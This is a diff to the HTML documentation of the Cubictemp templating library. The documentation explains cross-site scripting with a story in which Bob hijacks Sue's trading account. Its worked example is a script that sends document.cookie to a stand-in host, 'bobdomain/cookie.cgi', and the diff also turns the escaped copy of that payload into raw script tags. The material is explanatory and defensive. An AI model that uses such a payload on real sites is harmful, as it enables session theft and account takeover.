@@ -25,13 +25,10 @@ hacker, and wants to take over Sue's trading account. Bob knows that when he
 creates a new auction, the title he specifies for the auction gets inserted
 verbatim into the page. The relevant piece of HTML looks like this:</p>
 
-<!--(block foo)-->
-    <!--(raw)-->
-<h1> *Bob's title goes here* </h1>
-    <!--(end)-->
-<!--(end)-->
 <code class="template">
-	@!escape(repr(foo))!@<br>
+<!--(block|htmlescape)-->
+<h1> *Bob's title goes here* </h1>
+<!--(end)-->
 </code>
 
 <p> Since the title is unescaped, Bob can insert HTML tags, and even Javascript
@@ -40,17 +37,14 @@ of any user viewing this page, by making the user's browser post the cookie to
 a web-based form of his choice. Here is what the HTML snippet above looks like
 when after Bob has set the malicious title: </p>
 
-<!--(block foo)-->
-    <!--(raw)-->
+<code class="template">
+<!--(block|htmlescape)-->
 <h1>
 	<script>
 		document.location='http://bobdomain/cookie.cgi?' + document.cookie
 	</script> 
 </h1>
-    <!--(end)-->
 <!--(end)-->
-<code class="template">
-	@!escape(repr(foo))!@<br>
 </code>
 
 <p> All Bob has to do now is to wait until Sue views this page. When she does,
@@ -76,30 +70,20 @@ avoid XSS vulnerabilities - all substitutions are escaped by default. Let's
 revisit the example above. Say we had a Cubictemp template that looked like
 this:</p>
 
-<!--(block foo)-->
-    <!--(raw)-->
-<h1> @!title!@ </h1>
-    <!--(end)-->
+<!--(block|cubescript)-->
+<h1> @_!title!@ </h1>
 <!--(end)-->
-<code class="template">
-	@!escape(repr(foo))!@<br>
-</code>
 
 <p> Now when Bob sets his malicious title, the rendered template looks
 like this: </p>
 
-<!--(block foo)-->
-    <!--(raw)-->
+<!--(block|htmlescape)-->
 <h1>
-    &lt;script&gt;
+    <script>
         document.location='http://bobdomain/cookie.cgi?' + document.cookie
-    &lt;/script&gt; 
+    </script> 
 </h1>
-    <!--(end)-->
 <!--(end)-->
-<code class="template">
-	@!escape(repr(foo))!@<br>
-</code>
 
 <p> The special HTML characters &lt; and &gt; have been converted to their HTML
 escaped equivalents. Instead of interpreting the script above as Javascript,
